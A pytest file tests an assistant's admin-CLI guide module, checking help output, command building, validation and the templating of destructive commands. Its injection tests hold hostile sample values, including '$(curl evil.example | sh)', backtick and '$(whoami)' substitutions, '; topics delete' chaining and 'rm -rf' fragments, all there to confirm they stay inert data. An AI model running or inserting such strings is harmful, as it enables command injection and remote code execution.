"""The assistant's guide to the Admin CLI (ops_mcp/cli_guide.py).

What is held here: the reference it reads is the CLI's own; a command's help is shown as the CLI
prints it; a command is built in code, from real flags and checked values, and is one the real
parser accepts; a value is never more command; a command that deletes is never filled in; and the
guides' commands all exist. The parser is admin_cli's own, loaded from scripts/ as
test_ops_mcp_suggestions.py loads it."""

from __future__ import annotations

import importlib.util
import json
import shlex
from datetime import UTC, datetime
from pathlib import Path

import boto3
import pytest
from moto import mock_aws
from table_schemas import create_table

from common import editorial_resolver, fresh_review
from common.adapters.registry import ADAPTER_REGISTRY
from ops_mcp import cli_guide, memory, suggestions

SCRIPTS = Path(__file__).resolve().parents[2] / "scripts"
REGION = "ap-southeast-2"
PROGRAM = "python scripts/admin_cli.py"
USER = "11111111-2222-3333-4444-555555555555"


def _load(name: str):
    spec = importlib.util.spec_from_file_location(f"{name}_for_cli_guide", SCRIPTS / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture(scope="module")
def admin_cli():
    return _load("admin_cli")


@pytest.fixture(scope="module")
def parser(admin_cli):
    return admin_cli.build_parser()


def built(result: dict) -> str:
    """The command on the one card a successful cli_command returns."""
    assert result["built"] is True, result
    (found,) = result["findings"]
    return found["suggestion"]["command"]


def parsed(parser, command: str) -> dict:
    """`command` split as a shell would and parsed by the real CLI. A command the CLI refuses
    exits, which fails the test."""
    assert command.startswith(PROGRAM + " ")
    return vars(parser.parse_args(shlex.split(command[len(PROGRAM) :])))


@pytest.fixture
def tables(monkeypatch):
    for key, value in {
        "AWS_DEFAULT_REGION": REGION,
        "AWS_ACCESS_KEY_ID": "testing",
        "AWS_SECRET_ACCESS_KEY": "testing",
        "TOPICS_TABLE": "Topics",
        "MODEL_CONFIG_TABLE": "ModelConfig",
        "OPERATOR_SUGGESTIONS_TABLE": "OperatorSuggestions",
    }.items():
        monkeypatch.setenv(key, value)
    import common.dynamo as dynamo_module

    dynamo_module._dynamodb_resource = None
    with mock_aws():
        client = boto3.client("dynamodb", region_name=REGION)
        for name, key in {"Topics": "topic_id", "ModelConfig": "config_id"}.items():
            create_table(
                client,
                TableName=name,
                KeySchema=[{"AttributeName": key, "KeyType": "HASH"}],
                AttributeDefinitions=[{"AttributeName": key, "AttributeType": "S"}],
                BillingMode="PAY_PER_REQUEST",
            )
        create_table(
            client,
            TableName="OperatorSuggestions",
            KeySchema=[
                {"AttributeName": "user_id", "KeyType": "HASH"},
                {"AttributeName": "item", "KeyType": "RANGE"},
            ],
            AttributeDefinitions=[
                {"AttributeName": "user_id", "AttributeType": "S"},
                {"AttributeName": "item", "AttributeType": "S"},
            ],
            BillingMode="PAY_PER_REQUEST",
        )
        yield boto3.resource("dynamodb", region_name=REGION)
    dynamo_module._dynamodb_resource = None


def put_topic(tables, topic_id, **fields):
    tables.Table("Topics").put_item(Item={"topic_id": topic_id, **fields})


# --- the reference -------------------------------------------------------------------------------


def test_the_reference_is_a_file_in_the_package_and_names_its_generator():
    assert cli_guide.REFERENCE_FILE.parent == Path(cli_guide.__file__).parent
    assert cli_guide.reference()["program"] == suggestions.ADMIN_CLI == PROGRAM
    assert "generate_cli_reference.py" in cli_guide.reference()["about"]


def test_with_nothing_the_reference_lists_every_command_with_one_line():
    result = cli_guide.cli_reference()

    listed = {row["command"]: row for row in result["commands"]}
    assert {"topics", "topics update", "equipment create", "inbox", "approve"} <= set(listed)
    assert listed["topics"]["group"] is True and listed["topics update"]["help"] == "Update a topic"
    assert result["findings"] == []  # data for choosing a command: nothing is put on screen


def test_with_a_command_the_reference_gives_its_arguments_and_their_help():
    result = cli_guide.cli_reference("topics update")

    options = {row["option"]: row for row in result["arguments"]}
    assert options["topic_id"]["kind"] == "positional" and options["topic_id"]["required"] is True
    assert "inherit the pipeline-wide default" in options["--research-interval-hours"]["help"]
    assert options["--review-mode"]["choices"] == ["off", "shadow", "enforce", ""]
    assert result["needs"] == "at least one option" and result["destructive"] is False
    assert cli_guide.cli_reference("python scripts/admin_cli.py topics update --help")["command"] == (
        "topics update"
    )
    assert cli_guide.cli_reference("equipment")["subcommands"][0] == "equipment list"


def test_a_command_that_does_not_exist_is_answered_with_the_nearest_that_do():
    result = cli_guide.cli_reference("topics nuke; rm -rf")

    assert result["known"] is False and result["findings"] == []
    assert "nuke" not in result["spoken"] and "rm -rf" not in result["spoken"]  # not repeated
    assert "topics delete" in result["nearest"]
    assert cli_guide.cli_command("gear make", {})["findings"] == []
    assert cli_guide.cli_help(["nothing like it"])["findings"] == []


# --- cli_help: the command's own --help ----------------------------------------------------------


def test_help_is_a_card_with_the_cli_s_own_text_and_the_line_that_prints_it(parser):
    result = cli_guide.cli_help(["topics update"])

    (found,) = result["findings"]
    assert found["kind"] == "how_to" and found["id"] == "help-topics-update"
    assert found["help"] == cli_guide.reference()["commands"]["topics update"]["help_text"]
    assert found["help"].startswith("usage: admin_cli.py topics update [-h]")
    assert "--research-interval-hours RESEARCH_INTERVAL_HOURS" in found["help"]
    assert found["suggestion"]["command"] == "python scripts/admin_cli.py topics update --help"
    assert "changes nothing" in found["suggestion"]["what_it_does"]
    # The line really is the one that prints help: argparse exits 0 on it.
    with pytest.raises(SystemExit) as stopped:
        parser.parse_args(shlex.split(found["suggestion"]["command"][len(PROGRAM) :]))
    assert stopped.value.code == 0
    assert "usage" not in result["spoken"]  # the help is on screen, never spoken


def test_a_question_that_spans_commands_gets_each_one_s_help_capped_and_in_order():
    asked = ["pipeline-config set", "topics update", "model-config set", "models list", "topics update"]

    result = cli_guide.cli_help(asked)

    assert [found["where"]["command"] for found in result["findings"]] == asked[: cli_guide.HELP_MAX]
    assert "ask for the other" in result["spoken"]
    assert cli_guide.cli_help("topics delete")["findings"][0]["help"]  # help is shown for any command


@pytest.mark.parametrize("path", cli_guide.command_paths(groups=True))
def test_every_command_has_help_that_names_it(path):
    (found,) = cli_guide.cli_help([path])["findings"]

    assert found["help"].startswith(f"usage: admin_cli.py {path} ")
    assert len(found["help"]) < 4000


# --- cli_command: built in code ------------------------------------------------------------------


def test_a_command_is_built_from_a_path_and_options_and_the_cli_accepts_it(parser):
    result = cli_guide.cli_command("topics update", {"topic_id": "crypto", "research_interval_hours": 3})

    command = built(result)
    assert command == "python scripts/admin_cli.py topics update crypto --research-interval-hours 3"
    assert parsed(parser, command)["research_interval_hours"] == "3"
    (found,) = result["findings"]
    assert found["kind"] == "how_to" and found["where"] == {"command": "topics update"}
    # What it does is the CLI's own help: the command's line, then the flag used.
    assert found["suggestion"]["what_it_does"].startswith("Update a topic. --research-interval-hours: Whole")
    assert found["suggestion"]["action"]
    assert "python" not in result["spoken"] and "--" not in result["spoken"]


def test_options_are_named_by_flag_or_by_stored_name_and_switches_by_true_or_false(parser):
    by_flag = built(cli_guide.cli_command("topics create", {"--topic-id": "ai", "--name": "AI news"}))
    by_dest = built(cli_guide.cli_command("topics create", {"topic_id": "ai", "name": "AI news"}))
    assert by_flag == by_dest == "python scripts/admin_cli.py topics create --topic-id ai --name 'AI news'"

    on = built(cli_guide.cli_command("topics update", {"topic_id": "ai", "financial": True}))
    off = built(cli_guide.cli_command("topics update", {"topic_id": "ai", "no_financial": True}))
    assert parsed(parser, on)["financial"] is True and parsed(parser, off)["financial"] is False

    rewrite = built(
        cli_guide.cli_command("articles rewrite", {"article_id": "a1", "model": "m", "i": "fix it"})
    )
    assert parsed(parser, rewrite)["instructions"] == "fix it" and parsed(parser, rewrite)["model_id"] == "m"

    two = built(
        cli_guide.cli_command("equipment equip", {"topic_id": "ai", "version": "v1", "replace": ["ai", "v0"]})
    )
    assert parsed(parser, two)["replace"] == ["ai", "v0"]


def test_an_empty_value_clears_a_setting_and_survives_the_shell(parser):
    command = built(cli_guide.cli_command("topics update", {"topic_id": "ai", "review_mode": ""}))

    assert command.endswith("--review-mode=''")
    assert parsed(parser, command)["review_mode"] == ""


def test_what_is_required_and_missing_comes_back_as_questions_not_an_error():
    result = cli_guide.cli_command("topics create", {"adapter": "hacker_news"})

    assert result["built"] is False and result["findings"] == [] and result["problems"] == []
    assert [question["option"] for question in result["questions"]] == ["--topic-id", "--name"]
    assert "What is the topic id?" in result["spoken"]
    pipeline = cli_guide.cli_command("topics trigger", {"topic_id": "ai"})["questions"]
    assert pipeline[0]["ask"] == "Which pipeline: research_tick or daily_cycle?"


def test_a_command_that_needs_something_to_change_asks_what(admin_cli, parser, monkeypatch):
    """The CLI refuses these with nothing to change; argparse cannot say so, so cli_guide does.
    Each one's handler is run with no options to hold the list to the CLI."""

    def no_request(*args, **kwargs):
        raise AssertionError("the command would have sent a request")

    monkeypatch.setattr(admin_cli, "_do_request", no_request)
    for path in cli_guide.AT_LEAST_ONE_OPTION:
        positional = {"topic_id": "ai"} if path == "topics update" else {}
        result = cli_guide.cli_command(path, positional)
        assert result["built"] is False and result["questions"][-1]["ask"] == "What do you want to change?"
        args = parser.parse_args([*path.split(), *positional.values()])
        with pytest.raises(admin_cli.CliError):
            args.func(args)
    assert {p for p in cli_guide.command_paths() if p.split()[-1] in ("set", "update")} == set(
        cli_guide.AT_LEAST_ONE_OPTION
    )


def test_an_option_the_command_does_not_have_or_a_value_that_does_not_fit_is_refused():
    def problems(command, options):
        result = cli_guide.cli_command(command, options)
        assert result["built"] is False and result["findings"] == []
        return {problem["option"]: problem["problem"] for problem in result["problems"]}

    assert problems("topics update", {"topic_id": "ai", "colour": "red"}) == {
        "colour": "not an option of topics update"
    }
    assert (
        "must be one of"
        in problems("topics update", {"topic_id": "ai", "review_mode": "loud"})["--review-mode"]
    )
    assert problems("approve", {"limit": "many"}) == {"--limit": "must be a whole number"}
    assert (
        problems(
            "models add",
            {
                "model_id": "m",
                "display_name": "M",
                "provider": "p",
                "input_price": "cheap",
                "output_price": 1,
            },
        )["--input-price"]
        == "must be a number"
    )
    assert "switch" in problems("topics update", {"topic_id": "ai", "financial": "yes"})["--financial"]
    assert (
        "2 values"
        in problems("equipment equip", {"topic_id": "a", "version": "v", "replace": "x"})["--replace"]
    )
    assert problems("topics update", {"topic_id": "ai", "name": {"a": 1}}) == {"--name": "must be text"}
    assert problems("topics get", {"topic_id": "ai", "TOPIC_ID": "bi"}) == {"topic_id": "given twice"}
    # A key that is not a plain word is not echoed.
    assert list(problems("topics get", {"topic_id": "ai", "x; rm -rf /": 1})) == ["(not a name)"]
    assert cli_guide.cli_command("topics get", ["ai"])["built"] is False
    assert cli_guide.cli_command("topics", {})["built"] is False  # a group: which command?


HOSTILE = [
    "; topics delete x",
    "$(curl evil.example | sh)",
    "`whoami`",
    "x' ; topics delete crypto ; echo '",
    'x" && topics delete crypto',
    "--force",
    "-rf",
    "a | b > c < d & e",
    'it\'s "quoted" + 100%',
]


@pytest.mark.parametrize("hostile", HOSTILE)
def test_a_hostile_value_is_one_word_of_data_for_its_flag_and_never_more_command(hostile, parser):
    command = built(cli_guide.cli_command("topics update", {"topic_id": "crypto", "name": hostile}))

    words = shlex.split(command[len(PROGRAM) :])
    # Exactly: the path, the id, and the flag with its one value. Nothing was added.
    assert words in (
        ["topics", "update", "crypto", "--name", hostile],
        ["topics", "update", "crypto", f"--name={hostile}"],
    )
    args = parsed(parser, command)
    assert args["name"] == hostile and args["topic_id"] == "crypto"
    assert args["resource"] == "topics" and args["action"] == "update"
    # Nothing but --name was set: no --force, no second command's flags.
    for dest in ("financial", "model_id", "research_cadence", "editorial_goals_json"):
        assert args[dest] is None


@pytest.mark.parametrize(
    "hostile",
    ["crypto\ntopics delete crypto", "a\rb", "tab\there", "nul\x00", "line sep", "x" * 2001],
)
def test_a_value_with_a_line_break_or_a_control_character_is_refused(hostile):
    result = cli_guide.cli_command("topics update", {"topic_id": "crypto", "name": hostile})

    assert result["built"] is False and result["findings"] == []
    assert "delete" not in json.dumps(result)  # what was refused is not repeated anywhere


@pytest.mark.parametrize(
    "hostile", ["--force", "-x", "", "crypto\ntopics delete x", "crypto; topics delete x", "$(whoami)", "a b"]
)
def test_a_positional_that_is_not_a_plain_id_is_refused(hostile):
    result = cli_guide.cli_command("topics get", {"topic_id": hostile})

    assert result["built"] is False and result["findings"] == []


def test_a_json_flag_survives_the_shell_and_is_json_again(parser):
    """The value has double quotes, an apostrophe and a plus sign: after the shell's splitting it
    must still be the same JSON."""
    goals = {"exclusion_criteria": 'Don\'t give exact star counts: write "2,630+ stars" & move on.'}

    command = built(
        cli_guide.cli_command("topics update", {"topic_id": "github-trending", "editorial_goals_json": goals})
    )

    assert json.loads(parsed(parser, command)["editorial_goals_json"]) == goals
    assert cli_guide.SHELL_NOTE in json.dumps(
        cli_guide.cli_command(
            "topics update", {"topic_id": "github-trending", "editorial_goals_json": goals}
        )["findings"]
    )
    # Given as text it is parsed and written out again, so what is shown is always JSON.
    as_text = built(
        cli_guide.cli_command("topics update", {"topic_id": "t", "editorial_goals_json": json.dumps(goals)})
    )
    assert json.loads(parsed(parser, as_text)["editorial_goals_json"]) == goals
    cleared = built(cli_guide.cli_command("topics update", {"topic_id": "t", "editorial_goals_json": {}}))
    assert cleared.endswith("--editorial-goals-json '{}'")


def test_editorial_goals_are_checked_with_the_admin_api_s_own_validator():
    def problem(value):
        result = cli_guide.cli_command("topics update", {"topic_id": "t", "editorial_goals_json": value})
        assert result["built"] is False
        return result["problems"][0]["problem"]

    # A key the API does not take is refused in our words: the key itself is not repeated.
    assert (
        problem({"style; rm -rf": "be brief"})
        == "may hold only the keys primary_focus and exclusion_criteria"
    )
    assert editorial_resolver.validate_editorial_goals({"style": "be brief"}) is not None
    assert "at most 1000" in problem({"primary_focus": "x" * 1001})
    assert problem("{not json") == "is not valid JSON"
    assert problem("[1, 2]") == "must be a JSON object"


# --- commands that delete or take something down -------------------------------------------------

DESTRUCTIVE = [
    path for path in cli_guide.command_paths() if cli_guide.reference()["commands"][path]["destructive"]
]


def test_the_destructive_commands_are_the_ones_the_reference_marks():
    assert DESTRUCTIVE == [
        "topics delete", "articles unpublish", "moderation reject", "refinements reject", "equipment delete",
    ]  # fmt: skip


@pytest.mark.parametrize("path", DESTRUCTIVE)
def test_a_destructive_command_is_a_template_whatever_values_are_given(path, parser):
    real = {
        "topic_id": "crypto",
        "article_id": "f5e88f3a",
        "queue_id": "q-123",
        "version": "2026-10-01T00:00:00",
    }
    names = [a["dest"] for a in cli_guide.reference()["commands"][path]["arguments"] if not a["flags"]]

    result = cli_guide.cli_command(path, {name: real[name] for name in names})

    (found,) = result["findings"]
    command = found["suggestion"]["command"]
    assert found["destructive"] is True and found["warning"] == cli_guide.DESTRUCTIVE_WARNING
    assert command == f"{PROGRAM} {path} " + " ".join(f"<{name}>" for name in names)
    for value in real.values():
        assert value not in json.dumps(result)  # no real id anywhere in what goes to the page
    assert "<" in command and result["destructive"] is True
    assert "not filled it in" in result["spoken"]
    # Still a real command once the placeholders are replaced.
    parsed(parser, command.replace("<", "").replace(">", ""))


def test_force_turns_any_command_into_a_template(parser):
    result = cli_guide.cli_command(
        "articles rewrite", {"article_id": "f5e88f3a", "instructions": "remove it this minute", "force": True}
    )

    (found,) = result["findings"]
    assert found["destructive"] is True
    assert found["suggestion"]["command"] == (
        "python scripts/admin_cli.py articles rewrite <article_id> --instructions <instructions> --force"
    )
    assert "f5e88f3a" not in json.dumps(result) and "remove it this minute" not in json.dumps(result)
    trigger = cli_guide.cli_command(
        "topics trigger", {"topic_id": "crypto", "pipeline": "daily_cycle", "force": True}
    )
    assert trigger["findings"][0]["suggestion"]["command"].endswith(
        "topics trigger <topic_id> --pipeline <pipeline> --force"
    )
    # Without the flag it is an ordinary command, filled in.
    plain = built(
        cli_guide.cli_command(
            "topics trigger", {"topic_id": "crypto", "pipeline": "daily_cycle", "force": False}
        )
    )
    assert (
        plain.endswith("topics trigger crypto --pipeline daily_cycle")
        and parsed(parser, plain)["force"] is False
    )


def test_no_built_command_ever_deletes_with_an_id_in_it():
    """Every destructive path, with every option it has set to a hostile value: a template."""
    for path in DESTRUCTIVE:
        arguments = cli_guide.reference()["commands"][path]["arguments"]
        options = {a["name"]: (True if a["kind"] == "flag" else "crypto") for a in arguments}
        command = cli_guide.cli_command(path, options)["findings"][0]["suggestion"]["command"]
        assert "crypto" not in command and "<" in command


# --- memory: a how-to is not a suggestion to follow up -------------------------------------------


def test_a_how_to_finding_is_never_recorded_by_the_memory(tables):
    result = cli_guide.cli_command("topics trigger", {"topic_id": "crypto", "pipeline": "research_tick"})
    helped = cli_guide.cli_help(["topics update"])

    assert "how_to" not in suggestions.CATALOGUE
    for returned in (result, helped):
        assert not any(memory._recordable(found) or memory._has_key(found) for found in returned["findings"])
        assert memory.remember(USER, returned) == returned
    assert tables.Table("OperatorSuggestions").scan()["Items"] == []


# --- the guides ----------------------------------------------------------------------------------

FILLER = {
    "topic_id": "github-trending",
    "article_id": "f5e88f3a",
    "version": "2026-10-01T00:00:00+00:00",
    "name": "GitHub Trending",
    "adapter": "github_trending",
    "research_interval_hours": 3,
    "model_id": "a-model-id",
    "text": "Lead with the most useful fact.",
    "scope": "global",
    "instructions": "the second section is wrong",
    "editorial_goals_json": cli_guide.STAR_COUNT_GOAL,
}


def _steps():
    for key, guide in cli_guide.GUIDES.items():
        for index, step in enumerate(guide["steps"] + ([guide["example"]] if "example" in guide else [])):
            yield pytest.param(key, step, id=f"{key}-{index}-{step['command'].replace(' ', '-')}")


def test_the_guides_are_the_ones_the_owner_asked_for():
    assert list(cli_guide.GUIDES) == ["costs", "gear", "editorial-goals", "first-topic", "review"]
    listing = cli_guide.cli_guides()
    assert [guide["id"] for guide in listing["guides"]] == list(cli_guide.GUIDES)
    assert listing["findings"] == []


@pytest.mark.parametrize(("key", "step"), _steps())
def test_every_step_of_every_guide_builds_a_command_the_cli_accepts(key, step, parser):
    options = {**step["options"], **{name: FILLER[name] for name in step.get("ask", [])}}

    result = cli_guide.cli_command(step["command"], options)

    command = built(result)
    if result["destructive"]:
        command = command.replace("<", "").replace(">", "")
    args = parsed(parser, command)
    assert f"{args['resource']} {args.get('action') or ''}".strip() == step["command"]
    assert step["say"]


@pytest.mark.parametrize("key", list(cli_guide.GUIDES))
def test_every_command_a_guide_names_exists_and_its_main_ones_get_their_help(key, tables):
    result = cli_guide.cli_guides(key)

    guide = result["guide"]
    assert set(guide["commands"]) <= set(cli_guide.command_paths())
    helped = [found["where"]["command"] for found in result["findings"] if "help" in found]
    assert helped == guide["commands"][: cli_guide.HELP_MAX]
    assert all(found["kind"] == "how_to" for found in result["findings"])
    assert 2 <= len(guide["explanation"]) <= 5 and guide["title"]
    assert "python" not in result["spoken"]


@pytest.mark.parametrize(
    ("words", "key"),
    [
        ("I want to cut down on costs, how do I change how often topics fire?", "costs"),
        ("I'm trying to create gear, how do I do that?", "gear"),
        ("how would I set an editorial goal for the GitHub Trending topic", "editorial-goals"),
        ("getting started", "first-topic"),
        ("how do I add a topic", "first-topic"),
        ("how do I approve what is in the inbox", "review"),
        ("first-topic", "first-topic"),
    ],
)
def test_a_few_words_find_the_right_guide(words, key, tables):
    assert cli_guide.cli_guides(words)["guide"]["id"] == key


def test_words_that_match_no_guide_get_the_list():
    result = cli_guide.cli_guides("the weather in Sydney")

    assert "guide" not in result and len(result["guides"]) == len(cli_guide.GUIDES)


def test_the_cost_guide_points_at_the_interval_not_the_heartbeat(tables):
    result = cli_guide.cli_guides("costs")

    assert result["guide"]["commands"][:3] == ["pipeline-config set", "topics update", "model-config set"]
    text = " ".join(result["guide"]["explanation"])
    assert "raise the interval" in text and "1 to 168" in text
    helped = {found["where"]["command"]: found["help"] for found in result["findings"]}
    assert "--research-interval-hours" in helped["pipeline-config set"]
    assert "--research-interval-hours" in helped["topics update"]


def test_the_editorial_goals_example_is_the_owner_s_and_passes_the_api_s_validator(parser, tables):
    result = cli_guide.cli_guides("editorial-goals")

    example = result["findings"][-1]
    assert example["id"] == "example-editorial-goals" and example["noticed"].startswith("Example:")
    args = parsed(parser, example["suggestion"]["command"])
    goals = json.loads(args["editorial_goals_json"])
    assert args["topic_id"] == "github-trending" and goals == cli_guide.STAR_COUNT_GOAL
    # Only keys the Admin API takes, within its limits, and worded as the owner asked.
    assert editorial_resolver.validate_editorial_goals(goals) is None
    assert set(goals) <= set(editorial_resolver.GOAL_FIELDS)
    assert '"2,630+ stars"' in goals["exclusion_criteria"] and "2,637" in goals["exclusion_criteria"]
    # How it reaches the prompts: under the adapter's own focus, which it does not replace.
    prompt = editorial_resolver.resolve_editorial_goals(
        {"adapter": "github_trending", "editorial_goals": goals}
    )
    assert (
        prompt.startswith("Adapter-Specific Standard Goal:") and "Strict Constraints: Star counts" in prompt
    )
    # The guide says the block is replaced whole, to read it first, and which shell the quoting is for.
    text = " ".join(result["guide"]["explanation"])
    assert "replaces the whole block" in text and "topics get" in text and "POSIX shell" in text
    assert "no key just for writing style" in text
    assert [step["command"] for step in result["guide"]["steps"]] == ["topics get", "topics update"]
    # The help comes first: the example is the last card.
    assert [found["id"] for found in result["findings"]][:2] == ["help-topics-update", "help-topics-get"]


def test_the_first_topic_guide_knows_whether_there_are_topics(tables):
    fresh = cli_guide.cli_guides("first-topic")
    assert fresh["topics"] == 0 and fresh["spoken"].startswith("Welcome. You have no topics yet")
    assert fresh["guide"]["explanation"][0].startswith("Welcome.")

    put_topic(tables, "crypto", name="Crypto")
    put_topic(tables, "hn", name="Hacker News")
    later = cli_guide.cli_guides("first-topic")
    assert later["topics"] == 2
    assert later["spoken"].startswith("You already have 2 topics; this is how you would add another.")
    assert len(later["guide"]["questions"]) == 4
    assert [step["command"] for step in later["guide"]["steps"]] == [
        "topics create", "topics trigger", "topics trigger",
    ]  # fmt: skip
    assert [step["options"] for step in later["guide"]["steps"][1:]] == [
        {"pipeline": "research_tick"}, {"pipeline": "daily_cycle"},
    ]  # fmt: skip


def test_the_first_topic_guide_still_answers_when_the_table_cannot_be_read(monkeypatch, capsys):
    monkeypatch.delenv("TOPICS_TABLE", raising=False)
    import common.dynamo as dynamo_module

    dynamo_module._dynamodb_resource = None

    result = cli_guide.cli_guides("first-topic")

    assert result["topics"] is None and "could not read the topics" in result["spoken"]
    assert "ops_cli_guide: could not count topics" in capsys.readouterr().out


def test_the_adapters_named_are_the_registry_s():
    assert set(cli_guide.ADAPTERS) == set(ADAPTER_REGISTRY)
    assert cli_guide.cli_command("topics create", {"topic_id": "t", "name": "T", "adapter": "hacker_news"})[
        "built"
    ]


# --- topics_overview -----------------------------------------------------------------------------


def seed(tables, count):
    for number in range(count):
        put_topic(
            tables,
            f"topic-{number:02d}",
            name=f"Topic {number}",
            research_cadence="rate(1 hour)",
            daily_cadence="cron(0 9 * * ? *)",
        )


def test_the_overview_is_a_table_of_the_first_five_and_says_how_many_more(tables):
    seed(tables, 7)

    result = cli_guide.topics_overview()

    table = result["table"]
    assert table["columns"] == cli_guide.OVERVIEW_COLUMNS and table["title"] == "Topics (5 of 7)"
    assert [row[1] for row in table["rows"]] == [f"topic-{n:02d}" for n in range(5)]
    assert all(len(row) == len(table["columns"]) for row in table["rows"])
    assert (result["total"], result["shown"], result["more"]) == (7, 5, 2)
    assert result["spoken"] == "You have 7 topics. The first 5 are on screen, and there are 2 more."
    assert result["findings"] == []


@pytest.mark.parametrize(("limit", "shown"), [(0, 1), (-3, 1), (3, 3), (50, 7), (500, 7)])
def test_the_limit_is_kept_between_one_and_fifty(tables, limit, shown):
    seed(tables, 7)

    assert cli_guide.topics_overview(limit)["shown"] == shown
    assert cli_guide.OVERVIEW_MAX_LIMIT == 50 and cli_guide.OVERVIEW_DEFAULT_LIMIT == 5


def test_a_row_shows_each_setting_and_where_it_is_inherited(tables):
    tables.Table("ModelConfig").put_item(
        Item={"config_id": "pipeline", "research_interval_hours": 4, "review_mode": "enforce"}
    )
    put_topic(
        tables,
        "crypto",
        name="Crypto",
        adapter="crypto_feed",
        research_cadence="rate(1 hour)",
        research_interval_hours=6,
        daily_cadence="cron(0 9 * * ? *)",
        daily_timezone="Australia/Sydney",
        model_id_candidates=["model-a", "model-b"],
        is_financial=True,
        review_mode="off",
        last_research_at=datetime(2026, 10, 4, 11, 0, tzinfo=UTC).isoformat(),
        last_article_at="2026-10-03T23:05:00+00:00",
    )
    put_topic(tables, "hn", name="Hacker News")

    rows = {
        row[1]: dict(zip(cli_guide.OVERVIEW_COLUMNS, row))
        for row in cli_guide.topics_overview()["table"]["rows"]
    }

    assert rows["crypto"] == {
        "Name": "Crypto", "Topic id": "crypto", "Adapter": "crypto_feed",
        "Research heartbeat": "rate(1 hour)", "Research interval": "6 h",
        "Daily cadence": "cron(0 9 * * ? *)", "Timezone": "Australia/Sydney",
        "Model": "rotates: model-a, model-b", "Financial": "yes", "Review mode": "off",
        "Last researched": "2026-10-04 11:00 UTC", "Last article": "2026-10-03 23:05 UTC",
    }  # fmt: skip
    assert rows["hn"]["Research interval"] == "4 h (inherited)"
    assert rows["hn"]["Review mode"] == "enforce (inherited)"
    assert rows["hn"]["Model"] == "pipeline default" and rows["hn"]["Adapter"] == "web_search"
    assert rows["hn"]["Timezone"] == "UTC" and rows["hn"]["Last researched"] == "never"


def test_one_topic_is_shown_in_full(tables):
    put_topic(
        tables,
        "github-trending",
        name="GitHub Trending",
        adapter="github_trending",
        editorial_goals=cli_guide.STAR_COUNT_GOAL,
        adapter_config={"language": "python"},
    )

    result = cli_guide.topics_overview(topic="github-trending")

    table = result["table"]
    settings = dict(table["rows"])
    assert table["columns"] == ["Setting", "Value"] and table["title"] == "GitHub Trending: settings"
    assert (
        settings["Topic id"] == "github-trending" and settings["Adapter config"] == '{"language": "python"}'
    )
    assert settings["Editorial goals"].startswith('{"exclusion_criteria": "Star counts need not be exact')
    assert len(settings["Editorial goals"]) <= cli_guide.DETAIL_MAX_CHARS
    assert result["spoken"] == "GitHub Trending's settings are on screen."


def test_an_id_that_is_not_one_or_is_not_there_is_said_so(tables):
    assert "table" not in cli_guide.topics_overview(topic="x; topics delete y")
    assert cli_guide.topics_overview(topic="nope")["spoken"] == "I can't find a topic with that id."
    assert cli_guide.topics_overview()["spoken"] == "There are no topics yet."


def test_a_cell_is_one_short_line_whatever_is_stored(tables):
    put_topic(tables, "odd", name="A name\nwith a break " + "x" * 200, adapter="web\x00search")

    (row,) = cli_guide.topics_overview()["table"]["rows"]

    assert "\n" not in row[0] and len(row[0]) <= cli_guide.CELL_MAX_CHARS
    assert "\x00" not in row[2]


@pytest.mark.parametrize("topic_mode", [None, "off", "shadow", "enforce", "loud"])
@pytest.mark.parametrize("pipeline_mode", [None, "off", "enforce", "loud"])
def test_the_review_mode_shown_is_the_one_the_pipeline_would_use(topic_mode, pipeline_mode):
    topic = {"review_mode": topic_mode} if topic_mode else {}
    config = {"review_mode": pipeline_mode} if pipeline_mode else None

    shown = cli_guide._review(topic, config)

    assert shown.split(" ")[0] == fresh_review.resolve_review_mode(config, topic)
    assert (cli_guide.REVIEW_MODES, cli_guide.DEFAULT_REVIEW_MODE) == (
        fresh_review.REVIEW_MODES, fresh_review.DEFAULT_REVIEW_MODE,
    )  # fmt: skip
